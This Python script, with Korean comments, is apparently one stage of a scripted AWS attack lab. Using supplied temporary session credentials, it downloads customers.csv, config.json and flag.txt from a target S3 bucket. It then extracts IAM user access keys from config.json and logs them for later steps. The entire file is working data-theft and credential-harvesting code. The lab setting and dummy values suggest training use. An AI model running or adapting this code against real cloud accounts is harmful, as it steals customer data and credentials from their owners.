"""
Step 3 — Exfiltration (데이터 유출)
target 버킷에서 customers.csv, config.json, flag.txt 를 로컬에 저장하고
config.json 을 파싱해 IAM User 자격증명 딕셔너리를 반환한다.

단독 실행:
    python step3_exfiltration.py \\
        --access-key ASIA... --secret-key wJalr... --token IQoJb... \\
        --bucket cloud9-attack-target-a1b2c3d4
"""

import argparse
import json
import logging
import os
import sys

import boto3
from botocore.exceptions import ClientError

sys.path.insert(0, __file__.rsplit("\\", 1)[0] if "\\" in __file__ else ".")
import config

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger(__name__)


def _ensure_exfil_dir() -> str:
    base = os.path.dirname(os.path.abspath(__file__))
    exfil_dir = os.path.join(base, config.EXFIL_DIR)
    os.makedirs(exfil_dir, exist_ok=True)
    return exfil_dir


def _download_object(s3, bucket: str, key: str, dest_path: str) -> bool:
    try:
        resp = s3.get_object(Bucket=bucket, Key=key)
        data = resp["Body"].read()
        with open(dest_path, "wb") as f:
            f.write(data)
        log.info("  [+] 다운로드 완료: %s → %s (%d bytes)", key, dest_path, len(data))
        return True
    except ClientError as e:
        log.error("  [-] 다운로드 실패 (%s): %s", key, e)
        return False


def _parse_iam_credentials(cred_path: str) -> dict:
    """
    config.json 파싱.
    파일 형식: {"AccessKeyId": "...", "SecretAccessKey": "...", "IAMUser": "..."}
    더미 데이터이므로 실제 인증에 사용되지 않으나 구조는 그대로 반환한다.
    """
    with open(cred_path, "r", encoding="utf-8") as f:
        data = json.load(f)

    required = {"AccessKeyId", "SecretAccessKey"}
    missing = required - data.keys()
    if missing:
        raise ValueError(f"config.json 필드 누락: {missing}")

    return {
        "AccessKeyId":     data["AccessKeyId"],
        "SecretAccessKey": data["SecretAccessKey"],
        "IAMUser":         data.get("IAMUser", config.IAM_USER_NAME),
    }


def run(access_key: str, secret_key: str, token: str, bucket: str | None = None) -> dict:
    """
    Returns: {
        "downloaded": [str, ...],           # 성공한 파일 키 목록
        "iam_user_creds": {                 # config.json 파싱 결과
            "AccessKeyId": str,
            "SecretAccessKey": str,
            "IAMUser": str,
        }
    }
    """
    log.info("=" * 60)
    log.info("Step 3: Exfiltration (데이터 유출)")
    log.info("=" * 60)

    bucket = bucket or config.TARGET_BUCKET
    exfil_dir = _ensure_exfil_dir()

    session = boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=token,
        region_name=config.REGION,
    )
    s3 = session.client("s3", region_name=config.REGION)

    downloaded = []
    for key in config.EXFIL_FILES:
        dest = os.path.join(exfil_dir, os.path.basename(key))
        if _download_object(s3, bucket, key, dest):
            downloaded.append(key)

    # config.json 파싱
    cred_local = os.path.join(exfil_dir, "config.json")
    if not os.path.exists(cred_local):
        raise RuntimeError("config.json 다운로드 실패 — IAM User 자격증명 획득 불가")

    iam_user_creds = _parse_iam_credentials(cred_local)
    log.info("  [+] IAM User     : %s", iam_user_creds["IAMUser"])
    log.info("  [+] AccessKeyId  : %s", iam_user_creds["AccessKeyId"])
    log.info("  [!] SecretKey는 더미값 — 실제 키로 교체 필요")

    result = {
        "downloaded":     downloaded,
        "iam_user_creds": iam_user_creds,
    }
    log.info("[Step 3 완료] 유출 파일: %s", downloaded)
    return result


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Step 3: S3 target 버킷 데이터 유출")
    parser.add_argument("--access-key",  required=True)
    parser.add_argument("--secret-key",  required=True)
    parser.add_argument("--token",       required=True)
    parser.add_argument("--bucket",      default=None,
                        help="타겟 버킷명 (기본: config.TARGET_BUCKET)")
    args = parser.parse_args()

    result = run(args.access_key, args.secret_key, args.token, args.bucket)
    print("\n[결과]")
    print(json.dumps(result, indent=2, ensure_ascii=False))
